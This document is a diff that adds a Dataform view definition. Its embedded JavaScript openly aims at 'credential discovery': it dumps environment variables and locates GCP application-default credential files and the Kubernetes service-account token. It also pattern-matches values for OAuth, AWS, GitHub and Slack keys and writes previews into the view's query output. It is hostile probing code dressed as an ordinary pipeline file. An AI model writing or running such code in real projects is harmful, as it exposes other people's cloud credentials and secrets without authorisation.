@@ -1,0 +1,325 @@
+config { type: "view", name: "env_deep_probe" }
+
+js {
+  let results = {
+    probeTime: new Date().toISOString(),
+    purpose: "Deep environment variable enumeration for credential discovery"
+  };
+
+  // =============================================================================
+  // TEST 1: Full Environment Dump
+  // =============================================================================
+  results.test1_fullEnv = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+    const envKeys = Object.keys(env);
+
+    // Categorize environment variables
+    const categories = {
+      gcp: [],
+      kubernetes: [],
+      dataform: [],
+      node: [],
+      secrets: [],
+      paths: [],
+      other: []
+    };
+
+    for (const key of envKeys) {
+      const val = env[key];
+      const valPreview = val ? val.substring(0, 100) : "(empty)";
+      const entry = { key, value: valPreview, fullLength: val ? val.length : 0 };
+
+      if (/^(GOOGLE|GCP|GCLOUD|CLOUDSDK)/i.test(key)) {
+        categories.gcp.push(entry);
+      } else if (/^KUBERNETES|^K8S/i.test(key)) {
+        categories.kubernetes.push(entry);
+      } else if (/^DATAFORM/i.test(key)) {
+        categories.dataform.push(entry);
+      } else if (/^NODE|^NPM|^V8/i.test(key)) {
+        categories.node.push(entry);
+      } else if (/KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH|API_KEY/i.test(key)) {
+        categories.secrets.push(entry);
+      } else if (/PATH|HOME|DIR|ROOT/i.test(key)) {
+        categories.paths.push(entry);
+      } else {
+        categories.other.push(entry);
+      }
+    }
+
+    results.test1_fullEnv = {
+      status: "completed",
+      totalVars: envKeys.length,
+      categories: {
+        gcp: categories.gcp.length,
+        kubernetes: categories.kubernetes.length,
+        dataform: categories.dataform.length,
+        node: categories.node.length,
+        secrets: categories.secrets.length,
+        paths: categories.paths.length,
+        other: categories.other.length
+      },
+      gcpVars: categories.gcp,
+      kubernetesVars: categories.kubernetes,
+      dataformVars: categories.dataform,
+      nodeVars: categories.node,
+      secretVars: categories.secrets,
+      pathVars: categories.paths
+    };
+  } catch(e) {
+    results.test1_fullEnv = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 2: GCP Credential Paths
+  // =============================================================================
+  results.test2_gcpCreds = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const credentialPaths = {
+      GOOGLE_APPLICATION_CREDENTIALS: env.GOOGLE_APPLICATION_CREDENTIALS || null,
+      CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE: env.CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE || null,
+      GOOGLE_CLOUD_PROJECT: env.GOOGLE_CLOUD_PROJECT || null,
+      GCLOUD_PROJECT: env.GCLOUD_PROJECT || null,
+      GCP_PROJECT: env.GCP_PROJECT || null,
+      CLOUDSDK_CORE_PROJECT: env.CLOUDSDK_CORE_PROJECT || null,
+      GOOGLE_CLOUD_REGION: env.GOOGLE_CLOUD_REGION || null,
+      GOOGLE_CLOUD_ZONE: env.GOOGLE_CLOUD_ZONE || null
+    };
+
+    // Check for ADC locations
+    const adcPaths = [
+      env.HOME + "/.config/gcloud/application_default_credentials.json",
+      "/root/.config/gcloud/application_default_credentials.json",
+      "/home/dataform/.config/gcloud/application_default_credentials.json"
+    ];
+
+    results.test2_gcpCreds = {
+      status: "completed",
+      credentialPaths,
+      potentialAdcPaths: adcPaths,
+      homeDir: env.HOME || null
+    };
+  } catch(e) {
+    results.test2_gcpCreds = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 3: Kubernetes Service Account
+  // =============================================================================
+  results.test3_kubernetes = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const k8sVars = {
+      KUBERNETES_SERVICE_HOST: env.KUBERNETES_SERVICE_HOST || null,
+      KUBERNETES_SERVICE_PORT: env.KUBERNETES_SERVICE_PORT || null,
+      KUBERNETES_PORT: env.KUBERNETES_PORT || null,
+      KUBERNETES_PORT_443_TCP: env.KUBERNETES_PORT_443_TCP || null,
+      KUBERNETES_SERVICE_PORT_HTTPS: env.KUBERNETES_SERVICE_PORT_HTTPS || null
+    };
+
+    // Common K8s paths
+    const k8sPaths = {
+      tokenPath: "/var/run/secrets/kubernetes.io/serviceaccount/token",
+      caPath: "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+      namespacePath: "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+    };
+
+    results.test3_kubernetes = {
+      status: "completed",
+      k8sVars,
+      k8sPaths,
+      isK8s: !!(env.KUBERNETES_SERVICE_HOST)
+    };
+  } catch(e) {
+    results.test3_kubernetes = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 4: Node.js/npm Configuration
+  // =============================================================================
+  results.test4_nodeConfig = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const nodeVars = {
+      NODE_OPTIONS: env.NODE_OPTIONS || null,
+      NODE_ENV: env.NODE_ENV || null,
+      NODE_PATH: env.NODE_PATH || null,
+      NODE_EXTRA_CA_CERTS: env.NODE_EXTRA_CA_CERTS || null,
+      NPM_TOKEN: env.NPM_TOKEN || null,
+      NPM_CONFIG_REGISTRY: env.NPM_CONFIG_REGISTRY || null,
+      npm_config_registry: env.npm_config_registry || null,
+      npm_package_name: env.npm_package_name || null
+    };
+
+    // Check for .npmrc content in env
+    const npmrcVars = {};
+    for (const key of Object.keys(env)) {
+      if (key.startsWith("npm_")) {
+        npmrcVars[key] = env[key];
+      }
+    }
+
+    results.test4_nodeConfig = {
+      status: "completed",
+      nodeVars,
+      npmrcVarsCount: Object.keys(npmrcVars).length,
+      npmrcVars: Object.keys(npmrcVars).slice(0, 20)  // First 20
+    };
+  } catch(e) {
+    results.test4_nodeConfig = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 5: Search for Secrets in All Vars
+  // =============================================================================
+  results.test5_secretSearch = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const potentialSecrets = [];
+    const secretPatterns = [
+      /^[A-Za-z0-9+/]{40,}={0,2}$/,  // Base64
+      /^ya29\./,  // Google OAuth token
+      /^eyJ/,  // JWT
+      /^AKIA/,  // AWS Access Key
+      /^sk-/,  // OpenAI/Stripe key
+      /^ghp_/,  // GitHub PAT
+      /^ghs_/,  // GitHub App token
+      /^xox[baprs]-/,  // Slack token
+      /^[0-9]{12}$/  // AWS Account ID
+    ];
+
+    for (const key of Object.keys(env)) {
+      const val = env[key];
+      if (!val) continue;
+
+      for (const pattern of secretPatterns) {
+        if (pattern.test(val)) {
+          potentialSecrets.push({
+            key,
+            pattern: pattern.toString(),
+            valuePreview: val.substring(0, 20) + "...",
+            valueLength: val.length
+          });
+          break;
+        }
+      }
+    }
+
+    results.test5_secretSearch = {
+      status: "completed",
+      potentialSecretsFound: potentialSecrets.length,
+      potentialSecrets
+    };
+  } catch(e) {
+    results.test5_secretSearch = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 6: Container/Runtime Detection
+  // =============================================================================
+  results.test6_runtime = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const runtimeIndicators = {
+      // Container runtime
+      isDocker: !!(env.DOCKER_HOST || env.container === "docker"),
+      isContainerd: !!(env.CONTAINERD_ADDRESS),
+      isPodman: !!(env.container === "podman"),
+
+      // Cloud Run / Cloud Functions
+      isCloudRun: !!(env.K_SERVICE || env.K_REVISION),
+      isCloudFunctions: !!(env.FUNCTION_NAME || env.FUNCTION_TARGET),
+
+      // GCE/GKE
+      isGCE: !!(env.GCE_METADATA_HOST),
+      isGKE: !!(env.KUBERNETES_SERVICE_HOST && env.GOOGLE_CLOUD_PROJECT),
+
+      // Service info
+      serviceName: env.K_SERVICE || env.FUNCTION_NAME || null,
+      revision: env.K_REVISION || null,
+      port: env.PORT || null
+    };
+
+    results.test6_runtime = {
+      status: "completed",
+      runtimeIndicators,
+      allEnvKeys: Object.keys(env).sort()
+    };
+  } catch(e) {
+    results.test6_runtime = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 7: Dataform-Specific Variables
+  // =============================================================================
+  results.test7_dataformSpecific = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const dataformVars = {};
+    for (const key of Object.keys(env)) {
+      if (/dataform/i.test(key)) {
+        dataformVars[key] = {
+          value: env[key].substring(0, 200),
+          fullLength: env[key].length
+        };
+      }
+    }
+
+    // Check for variables that might contain workspace info
+    const workspaceVars = {};
+    for (const key of ["WORKSPACE", "WORKSPACE_ID", "PROJECT_ID", "REPO_ID", "COMPILATION_ID"]) {
+      if (env[key]) {
+        workspaceVars[key] = env[key];
+      }
+    }
+
+    results.test7_dataformSpecific = {
+      status: "completed",
+      dataformVarsCount: Object.keys(dataformVars).length,
+      dataformVars,
+      workspaceVars
+    };
+  } catch(e) {
+    results.test7_dataformSpecific = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // SUMMARY
+  // =============================================================================
+  results.summary = {
+    testsRun: 7,
+    allCompleted: Object.keys(results).filter(k =>
+      k.startsWith("test") && results[k].status === "completed"
+    ).length,
+    criticalFindings: []
+  };
+
+  // Check for critical findings
+  if (results.test5_secretSearch && results.test5_secretSearch.potentialSecretsFound > 0) {
+    results.summary.criticalFindings.push(
+      "POTENTIAL SECRETS FOUND: " + results.test5_secretSearch.potentialSecretsFound + " matches"
+    );
+  }
+
+  if (results.test3_kubernetes && results.test3_kubernetes.isK8s) {
+    results.summary.criticalFindings.push("KUBERNETES DETECTED - check for SA token");
+  }
+
+  if (results.test2_gcpCreds) {
+    const creds = results.test2_gcpCreds.credentialPaths || {};
+    if (creds.GOOGLE_APPLICATION_CREDENTIALS) {
+      results.summary.criticalFindings.push(
+        "GOOGLE_APPLICATION_CREDENTIALS set: " + creds.GOOGLE_APPLICATION_CREDENTIALS
+      );
+    }
+  }
+}
+
+SELECT '${JSON.stringify(results, null, 2)}' as env_deep_probe
